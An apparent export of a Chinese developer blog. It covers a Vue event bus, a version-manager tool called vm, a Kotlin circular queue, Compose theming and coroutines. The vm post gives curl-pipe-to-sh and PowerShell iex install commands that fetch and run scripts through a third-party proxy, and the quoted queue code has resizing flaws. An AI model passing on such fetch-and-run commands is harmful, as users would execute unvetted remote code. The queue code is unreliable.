<li>进一步思考，让所有的vc可以访问到该元素，可以在<code>VueComponent.prototype</code>上放属性。但是<code>VueComponent</code>必须为<code>Vue.extend</code>调用生成，而且他一定是新生成的<code>VueComponent</code>。或者直接进入源码修改<br><img src="/./o/r/35/1d5d1f9f-0222-4eb3-9f6e-50b3187400e8/1682055404_image.png" alt="image"></li>
</ol>
<h2 id="一个很重要的内置关系"><a href="#一个很重要的内置关系" class="headerlink" title="一个很重要的内置关系"></a>一个很重要的内置关系</h2><p><code>VueComponent.prototype._proto_ === Vue.prototype</code><br>3. 因此可以在Vue.prototype中引入全局事件总线。<br>4. 这里任然没有解决问题，因为只有一个vc或者vm实例对象才可以使用$on,$emit，因此要加一个vc，或者vm，或者直接绑定最大的父亲vm.prototype.$bus</p>
<h2 id="last-最终写法）"><a href="#last-最终写法）" class="headerlink" title="last(最终写法）"></a>last(最终写法）</h2><p>在main.js中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//创建vm</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el:&#x27;#app&#x27;,</span><br><span class="line">  render: h =&gt; h(App),</span><br><span class="line">  beforeCreate() &#123;</span><br><span class="line">    Vue.prototype.$bus = this //安装全局事件总线</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>然后vm中的x即可作为一个全局变量来使用了<br><em><strong>因为每个自定义事件只能绑定一个方法，因此为了避免一直占用着一个事件。要求在组件销毁前先解绑</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beforeDestroy()&#123;</span><br><span class="line">  this.$bus.$off(&#x27;hello&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>全新的多工具多平台管理工具vm</title>
    <url>/posts/3bed842d/</url>
    <content><![CDATA[<p>安利这个<a href="https://github.com/gvcgo/version-manager">https://github.com/gvcgo/version-manager</a><br>这是我最近刚体验到的一个新的多版本管理工具,怎么说,还在开发中,有些小问题正在解决,但是他的简洁程度和多版本整合让我感到非常惬意.</p>
<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><ul>
<li><p>for <strong>MacOS&#x2F;Linux</strong>(复制下面的命令到terminal执行即可)</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://gvc.1710717.xyz/proxy/https://raw.githubusercontent.com/gvcgo/version-manager/main/scripts/install.sh | sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>for <strong>Windows</strong>(复制下面的命令到powershell中执行即可)</p>
  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;https://gvc.1710717.xyz/proxy/https://raw.githubusercontent.com/gvcgo/version-manager/main/scripts/install.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>手动安装(当你的系统下载脚本出现问题时，可以选择手动安装)</p>
  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1. 从release页面下载对应的版本；</span><br><span class="line">2. 解压，打开终端或者Powershell，执行命令&quot;vm is&quot;，即可安装。</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="vm和vfox支持列表对比"><a href="#vm和vfox支持列表对比" class="headerlink" title="vm和vfox支持列表对比"></a>vm和vfox支持列表对比</h2><p>(这里真的太棒了,兼容了我所有需要使用的工具)</p>
<table>
<thead>
<tr>
<th>sdk</th>
<th>vm</th>
<th>vfox</th>
</tr>
</thead>
<tbody><tr>
<td><strong>java(jdk)</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>maven</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>gradle</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>kotlin</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>scala</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>groovy</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>python</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>pypy</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>miniconda</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>go</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>node</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>deno</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>bun</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>flutter(dart)</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>.net</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>zig</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>zls</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>php</strong></td>
<td>✅︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>rust</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>cmdline-tool(android)</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>vlang</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>v-analyzer</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>cygwin-installer</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>msys2-installer</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>julia</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>typst</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>typst-lsp</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>typst-preview</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>gleam</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>git-for-windows</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>neovim</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>vscode</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>protobuf(protoc)</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>lazygit</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>kubectl</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>acast(asciinema)</strong></td>
<td>✅︎</td>
<td>❌︎</td>
</tr>
<tr>
<td><strong>erlang(需要编译)</strong></td>
<td>❌︎</td>
<td>✅︎</td>
</tr>
<tr>
<td><strong>elixir(需要编译)</strong></td>
<td>❌︎</td>
<td>✅︎</td>
</tr>
</tbody></table>
<hr>
<h3 id="如何设置代理"><a href="#如何设置代理" class="headerlink" title="如何设置代理?"></a>如何设置代理?</h3><p><strong>代理或者反向代理任选其一进行设置，reverse-proxy由vm免费提供。对于github下载较慢或者失败的情况，你应该用得到。</strong></p>
<ul>
<li><p><strong>设置代理</strong></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vm set-proxy &lt;http://localhost:port or socks5://localhost:port&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>设置免费的反向代理</strong></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># reverse proxy &lt;https://gvc.1710717.xyz/proxy/&gt; is available for free.</span></span><br><span class="line">vm set-reverse-proxy https://gvc.1710717.xyz/proxy/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用国内镜像资源网站进行下载，对于部分有国内镜像的应用有效</strong>.</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vm use -mirror-in-china go@1.22.1</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="子命令介绍"><a href="#子命令介绍" class="headerlink" title="子命令介绍"></a>子命令介绍</h2><table>
<thead>
<tr>
<th>子命令</th>
<th>参数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>list</strong></td>
<td>-</td>
<td>显示支持的sdk列表(列表操作：j&#x2F;k翻动列表，q退出)</td>
</tr>
<tr>
<td><strong>search</strong></td>
<td>sdk-name</td>
<td>显示该sdk支持的版本列表</td>
</tr>
<tr>
<td><strong>use</strong></td>
<td>sdk-name@version</td>
<td>安装&#x2F;切换sdk到指定版本</td>
</tr>
<tr>
<td><strong>local</strong></td>
<td>sdk-name</td>
<td>显示sdk在本地已安装的版本</td>
</tr>
<tr>
<td><strong>uninstall</strong></td>
<td>sdk-name@version or sdk-name@all</td>
<td>卸载某个版本或者卸载所有版本</td>
</tr>
<tr>
<td><strong>clear-cache</strong></td>
<td>sdk-name</td>
<td>清除本地已缓存的压缩文件</td>
</tr>
<tr>
<td><strong>set-reverse-proxy</strong></td>
<td><a href="https://gvc.1710717.xyz/proxy/">https://gvc.1710717.xyz/proxy/</a></td>
<td>设置反向代理，用于github下载加速</td>
</tr>
<tr>
<td><strong>set-proxy</strong></td>
<td>http or socks5( scheme:&#x2F;&#x2F;host:port )</td>
<td>设置本地代理，可用于任何网站的下载加速</td>
</tr>
<tr>
<td><strong>env</strong></td>
<td>–remove&#x3D;false&#x2F;true</td>
<td>手动设置环境变量，比编辑shell配置文件或者打开windows环境变量管理更方便</td>
</tr>
<tr>
<td><strong>install-self</strong></td>
<td>-</td>
<td>安装vm到$HOME&#x2F;.vm，用户一般无需关心</td>
</tr>
<tr>
<td><strong>version</strong></td>
<td>-</td>
<td>显示vm的版本信息</td>
</tr>
<tr>
<td><strong>completion</strong></td>
<td>-</td>
<td>生成关于不同shell的自动补全(支持bash、zsh、fish、powershell)</td>
</tr>
</tbody></table>
<hr>
<h2 id="Windows用户须知"><a href="#Windows用户须知" class="headerlink" title="Windows用户须知"></a>Windows用户须知</h2><p><strong>注意</strong>: 如果你正在使用Win11，那么你需要开启<strong>开发者模式</strong>，因为vm在创建链接符号时需要相关权限。如果你正在使用Win10，遇到创建链接符号失败的错误时，建议使用管理员权限打开powershell后再重试。在Win下，通过<strong>vm</strong>安装应用成功之后，如果在当前powershell窗口中找不到该命令，可以关闭当前powershell窗口，再打开一个新的，此时环境变量就生效了，就可以找到相关命令了，这是Win的特性，暂时修正不了。此外，还需注意的是，extFAT和FAT32格式的磁盘不支持创建链接符号，因此，在Windows下务必请使用NTFS格式的磁盘。另外需要注意的是，<strong>如果在Windows下，如果开启了Hyper-V，那么vm会与系统自带的vm命令冲突，影响到系统自带的vm命令，这种情况下，vm安装时会进行判断，如果Hyper-V已开启，则vm.exe会被重命名为vmr.exe，用户直接使用vmr命令即可</strong>。</p>
]]></content>
      <tags>
        <tag>多平台管理工具</tag>
      </tags>
  </entry>
  <entry>
    <title>关于kotlin中的list数组</title>
    <url>/posts/b7e69161/</url>
    <content><![CDATA[<p>最近在刷leetcode的时候，突然发现有一些算法需要使用到队列和栈。<br>我本想着这东西并不是很难，但是认真考究一下，发现在kotlin中，并没有对于栈和队列的直接实现，而只有基础的数组和集合。<br>尽管他有很多的语法糖，包括<code>removeFirst()</code>,<code>removeLast()</code>，之类，使其可以轻松的实现队列和栈才能完成的功能。<br>但是对于removeFirst方法他是如何实现的呢？</p>
<h2 id="removeFirst"><a href="#removeFirst" class="headerlink" title="removeFirst"></a>removeFirst</h2><p>在这里先提出两种推测，</p>
<ol>
<li>他使用的是基于数组的形式实现。那么他完成<code>removeFirst</code>只能通过创建一个新的数组然后对原数组进行完整的遍历。这样子时间复杂度为<code>O(n)</code>，效率将会很低。</li>
<li>他使用基于链表的形式，使每一个数组中的对象通过next连接，这样子，他完成<code>removeFirst</code>的话,他的时间复杂度只是<code>O(1)</code>。<br>我并不能确定kotlin底层是否自动的帮我们基于不同的功能实现了不同类型的集合对象。像是java中的ArrayList，LinkedList。那么他的效率应该可以实现最优。于是我做了个测试<br>刚开始设置数组容量为100000时，他们相差不大<br><img src="https://image.zfxt.top/hexo-blog/%E5%85%B3%E4%BA%8Ekotlin%E4%B8%AD%E7%9A%84list%E6%95%B0%E7%BB%84-2023-12-11-16-36.png"><br>可是当我把数组容量提高100倍。<br><img src="https://image.zfxt.top/hexo-blog/%E5%85%B3%E4%BA%8Ekotlin%E4%B8%AD%E7%9A%84list%E6%95%B0%E7%BB%84-2023-12-13-13-01.png"><br>他的效率显著的下降了。<br>因此可以验证出，他是基于第一种方法，他完成<code>removeFirst</code>时，会对整个数组进行一次遍历。他的效率会非常低。而在kotlin中并没有LinkedList这样子的一个集合方法。所以在某种程度上要实现一个队列的话，他的效率会非常受影响。因此这里有一种采取循环队列的方式来实现高效的<code>removeFirst</code>方法。<blockquote>
<p>这后面的内容引用自<a href="https://cloud.tencent.com/developer/article/1941184">这里</a></p>
</blockquote>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LoopQueue</span>&lt;<span class="type">E : Any</span>&gt;(<span class="keyword">private</span> <span class="keyword">val</span> capacity: <span class="built_in">Int</span> = <span class="number">10</span>) : Queue&lt;E?&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">data</span> = arrayOfNulls&lt;Any&gt;(capacity + <span class="number">1</span>) <span class="keyword">as</span> Array&lt;E?&gt;</span><br><span class="line">    <span class="comment">//队首下标</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> front = <span class="number">0</span></span><br><span class="line">    <span class="comment">//队尾下标</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> tail = <span class="number">0</span></span><br><span class="line">    <span class="comment">//当前数据长度</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> size = <span class="number">0</span></span><br><span class="line">    <span class="comment">//实际容量位置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> arraySize = <span class="keyword">data</span>.size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">enqueue</span><span class="params">(e: <span class="type">E</span>?)</span></span> &#123;</span><br><span class="line">        <span class="comment">//大于数组长度，扩容</span></span><br><span class="line">        <span class="keyword">if</span> ((tail + <span class="number">1</span>) % arraySize == front) &#123;</span><br><span class="line">            resize(capacity * <span class="number">2</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        arraySize = <span class="keyword">data</span>.size</span><br><span class="line">        <span class="comment">//入队</span></span><br><span class="line">        <span class="keyword">data</span>[tail] = e</span><br><span class="line">        <span class="comment">//确定队尾位置</span></span><br><span class="line">        tail = (tail + <span class="number">1</span>) % arraySize</span><br><span class="line">        <span class="comment">//增加数据长度</span></span><br><span class="line">        ++size</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">resize</span><span class="params">(newCapacity: <span class="type">Int</span>)</span></span> &#123;</span><br><span class="line">        <span class="comment">//扩容大小为传入容量+1，因为我们一定会浪费一个空间</span></span><br><span class="line">        <span class="keyword">val</span> newData = arrayOfNulls&lt;Any&gt;(newCapacity + <span class="number">1</span>) <span class="keyword">as</span> Array&lt;E?&gt;</span><br><span class="line">        <span class="comment">//先确定当前容量大小</span></span><br><span class="line">        arraySize = <span class="keyword">data</span>.size</span><br><span class="line">        <span class="comment">//遍历旧数据源，存入新数组</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// it+front原因很简单，从 原队首 位置开始遍历相加</span></span><br><span class="line">        (<span class="number">0.</span>.size).forEach &#123;</span><br><span class="line">            newData[it] = <span class="keyword">data</span>[(it + front) % arraySize]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">data</span> = newData</span><br><span class="line">        <span class="comment">//新队首位置为0</span></span><br><span class="line">        front = <span class="number">0</span></span><br><span class="line">        <span class="comment">//新队尾位置为原数组的长度</span></span><br><span class="line">        tail = size</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">dequeue</span><span class="params">()</span></span>: E? &#123;</span><br><span class="line">      	<span class="comment">//容错判断</span></span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) <span class="keyword">throw</span> IllegalArgumentException(<span class="string">&quot;队列为null&quot;</span>)</span><br><span class="line">      	<span class="comment">//拿到队首位置</span></span><br><span class="line">        <span class="keyword">val</span> ret = <span class="keyword">data</span>[front]</span><br><span class="line">        <span class="keyword">data</span>[front] = <span class="literal">null</span></span><br><span class="line">      	<span class="comment">//移动队首位置</span></span><br><span class="line">        front = (front + <span class="number">1</span>) % arraySize</span><br><span class="line">        --size</span><br><span class="line">        <span class="comment">//缩容 </span></span><br><span class="line">        <span class="keyword">if</span> (size == capacity / <span class="number">4</span> &amp;&amp; capacity / <span class="number">2</span> != <span class="number">0</span>) resize(capacity / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">getFront</span><span class="params">()</span></span>: E? &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) <span class="keyword">throw</span> IllegalArgumentException(<span class="string">&quot;队列为null&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">data</span>[front]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">getSize</span><span class="params">()</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">isEmpty</span><span class="params">()</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> front == tail</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">toString</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">val</span> res = StringBuilder().append(<span class="string">&quot;Queue：&quot;</span>).append(<span class="string">&quot;front [&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (!isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//数据打印除重</span></span><br><span class="line">            <span class="keyword">data</span>.filterNotNull().forEach &#123;</span><br><span class="line">                res.append(it).append(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            res.deleteCharAt(res.length - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">&quot;] tail&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>关于compose的主题配色</title>
    <url>/posts/3b247948/</url>
    <content><![CDATA[<p>这篇文章主要是两点:</p>
<h2 id="compose的日夜间模式"><a href="#compose的日夜间模式" class="headerlink" title="compose的日夜间模式"></a>compose的日夜间模式</h2><p>在使用jetpack compose时,我们最开始写每个页面时,往往不会注意他的配色问题,通常都是选择将每个颜色都固定.可是这就会导致一个问题.日夜间模式切换后,不会有任何变化,这就让夜间使用者体验很差.<br>因此需要了解这一方面的问题:</p>
<h3 id="默认主题"><a href="#默认主题" class="headerlink" title="默认主题"></a>默认主题</h3><p>jetpack Compose是符合Material Design3的规范的.因此我们很多东西都可以遵循其特点,来实现最好的开发方式.</p>
<p><img src="https://image.zfxt.top/hexo-blog/%E5%85%B3%E4%BA%8Ecompose%E7%9A%84%E4%B8%BB%E9%A2%98%E9%85%8D%E8%89%B2-2024-03-25-12-54-34.png" alt="关于compose的主题配色-2024-03-25-12-54-34"><br>在<code>Theme.kt</code>里,我们可以看到如下代码:</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">val</span> DarkColorScheme = darkColorScheme(</span><br><span class="line">    primary = Purple80,</span><br><span class="line">    secondary = PurpleGrey80,</span><br><span class="line">    tertiary = Pink80,</span><br><span class="line">    background = Color(<span class="number">0xFF030303</span>),</span><br><span class="line">    onBackground = Color(<span class="number">0xFF25273D</span>),</span><br><span class="line">    onTertiary = Color.White</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">val</span> LightColorScheme = lightColorScheme(</span><br><span class="line">    primary = Purple40,</span><br><span class="line">    secondary = PurpleGrey40,</span><br><span class="line">    tertiary = Pink40,</span><br><span class="line">    background = Color(<span class="number">0xFFFFFBFE</span>),</span><br><span class="line">    onBackground = Color.White,</span><br><span class="line">    onTertiary = Color.Black</span><br><span class="line">    <span class="comment">/* Other default colors to override</span></span><br><span class="line"><span class="comment">    background = Color(0xFFFFFBFE),</span></span><br><span class="line"><span class="comment">    surface = Color(0xFFFFFBFE),</span></span><br><span class="line"><span class="comment">    onPrimary = Color.White,</span></span><br><span class="line"><span class="comment">    onSecondary = Color.White,</span></span><br><span class="line"><span class="comment">    onTertiary = Color.White,</span></span><br><span class="line"><span class="comment">    onBackground = Color(0xFF1C1B1F),</span></span><br><span class="line"><span class="comment">    onSurface = Color(0xFF1C1B1F),</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> isDarkTheme <span class="keyword">by</span> mutableStateOf(<span class="literal">false</span>)</span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">TodoListTheme</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    darkTheme: <span class="type">Boolean</span> = isSystemInDarkTheme()</span></span>,</span><br><span class="line">    <span class="comment">// Dynamic color is available on Android 12+</span></span><br><span class="line">    dynamicColor: <span class="built_in">Boolean</span> = <span class="literal">false</span>,</span><br><span class="line">    content: <span class="meta">@Composable</span> () -&gt; <span class="built_in">Unit</span></span><br><span class="line">) &#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>在这段代码里,<code>isSystemInDarkTheme()</code>是android自带的一个判断是否是夜间模式的方法,当他判断是夜间模式时,会选用上面的<code>LightColorScheme</code>或者<code>DarkColorScheme</code>,然后根据这些主题的配色自动选择他的颜色,<br>你也可以手动选择就像这种<img src="https://image.zfxt.top/hexo-blog/%E5%85%B3%E4%BA%8Ecompose%E7%9A%84%E4%B8%BB%E9%A2%98%E9%85%8D%E8%89%B2-2024-03-25-13-01-56.png" alt="关于compose的主题配色-2024-03-25-13-01-56">.</p>
<p><strong>当你遵循Material Design的设计后,在你选择切换夜间模式的时候,他的主题颜色也会随之变更</strong><br><img src="https://image.zfxt.top/hexo-blog/%E5%85%B3%E4%BA%8Ecompose%E7%9A%84%E4%B8%BB%E9%A2%98%E9%85%8D%E8%89%B2-2024-03-25-13-05-08.png" alt="关于compose的主题配色-2024-03-25-13-05-08"><br><img src="https://image.zfxt.top/hexo-blog/%E5%85%B3%E4%BA%8Ecompose%E7%9A%84%E4%B8%BB%E9%A2%98%E9%85%8D%E8%89%B2-2024-03-25-13-05-16.png" alt="关于compose的主题配色-2024-03-25-13-05-16"></p>
<p>更详细的内容可以看这个官方网站<a href="https://developer.android.com/codelabs/jetpack-compose-theming?hl=zh-cn#0">https://developer.android.com/codelabs/jetpack-compose-theming?hl=zh-cn#0</a><br>他也有推荐的主题适配工具<a href="https://m3.material.io/theme-builder#/custom">https://m3.material.io/theme-builder#/custom</a></p>
<h2 id="配置其他类型的主题"><a href="#配置其他类型的主题" class="headerlink" title="配置其他类型的主题"></a>配置其他类型的主题</h2><p>就是手动切换主题<br>他的大概思路就是:</p>
<ol>
<li><p>构建一个枚举类,设计多个不同的主题样式</p>
</li>
<li><p>修改这段代码</p>
 <figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> colorScheme = <span class="keyword">when</span> &#123;</span><br><span class="line">    dynamicColor &amp;&amp; Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.S -&gt; &#123;</span><br><span class="line">        <span class="keyword">val</span> context = LocalContext.current</span><br><span class="line">        <span class="keyword">if</span> (darkTheme) dynamicDarkColorScheme(context) <span class="keyword">else</span> dynamicLightColorScheme(context)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    darkTheme -&gt; DarkColorScheme</span><br><span class="line">    <span class="keyword">else</span> -&gt; LightColorScheme</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 将其增多几个选项,可以通过我们手动切换主题样式</p>
</li>
<li><p>将选择的主题存储在数据库或者一些其他的持久性存储中.</p>
</li>
<li><p>切换主题即可</p>
</li>
</ol>
<blockquote>
<p>引用自<a href="https://juejin.cn/post/7070671629713408031#heading-4">https://juejin.cn/post/7070671629713408031#heading-4</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>android</tag>
        <tag>compose</tag>
        <tag>主题配色</tag>
      </tags>
  </entry>
  <entry>
    <title>协程使用指南：依赖、概念和用法</title>
    <url>/posts/a0822033/</url>
    <content><![CDATA[<p>在使用协程前，必须引入相关的依赖包</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">implementation(<span class="string">&quot;org.jetbrains.kotlinx:kotlinx-coroutines-core:1.7.1&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="协程（1）"><a href="#协程（1）" class="headerlink" title="协程（1）"></a>协程（1）</h2><p>本质上，协程可以称为<strong>轻量级线程</strong>。<br>而且协程只能在协程作用域内才能启动。有CoroutineScope,GlobalScope(全局)两种作用域。而且在全局作用域内启动的协程，只受整个应用的生命周期的限制。即只要整个应用程序还在运行中，只要协程的任务还未结束，该协程就可以一直运行</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">delay()</span><br><span class="line"><span class="comment">//delay是一个挂起函数，他并不会阻塞线程，而是将协程挂起，在特定的时候再继续执行。</span></span><br><span class="line">thread.sleep()</span><br><span class="line"><span class="comment">//而thread.sleep将会阻塞线程。</span></span><br></pre></td></tr></table></figure>
<p>举例：当协程 A 调用 delay(1000L) 函数来指定延迟1秒后再运行时，协程 A 所在的线程只是会挂起，转而去执行协程 B，等到1秒后再把协程 A 加入到可调度队列里。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例程</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line"></span><br><span class="line">    repeat(<span class="number">100</span>)&#123;</span><br><span class="line">        launch &#123;</span><br><span class="line">            println(it)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    Thread.sleep(2000)</span></span><br><span class="line">    delay(<span class="number">2000</span>)</span><br><span class="line">    println(<span class="string">&quot;你再干嘛&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//使用Thread时，前面所有的数据都不会输出，因为线程被阻塞在主线程中，而如果使用delay。会先重复完100次，再来输出最后的话</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="桥接阻塞与非阻塞的世界"><a href="#桥接阻塞与非阻塞的世界" class="headerlink" title="桥接阻塞与非阻塞的世界"></a>桥接阻塞与非阻塞的世界</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">    GlobalScope.launch &#123; <span class="comment">// launch a new coroutine in background and continue</span></span><br><span class="line">        delay(<span class="number">1000L</span>)</span><br><span class="line">        println(<span class="string">&quot;World!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">&quot;Hello,&quot;</span>) <span class="comment">// main thread continues here immediately</span></span><br><span class="line">    runBlocking &#123;     <span class="comment">// but this expression blocks the main thread</span></span><br><span class="line">        delay(<span class="number">2000L</span>)  <span class="comment">// ... while we delay for 2 seconds to keep JVM alive</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，runBocking等同于一个普通函数，但是，它可以构造一个协程作用域，在该作用域内，可以拉起线程。而且他必须执行完内部的所有程序才会结束。<br>而他可以直接简化为main函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fun main() = runBlocking&lt;Unit&gt; &#123; // start main coroutine</span><br><span class="line">    GlobalScope.launch &#123; // launch a new coroutine in background and continue</span><br><span class="line">        delay(1000L)</span><br><span class="line">        println(&quot;World!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    println(&quot;Hello,&quot;) // main coroutine continues here immediately</span><br><span class="line">    delay(2000L)      // delaying for 2 seconds to keep JVM alive</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
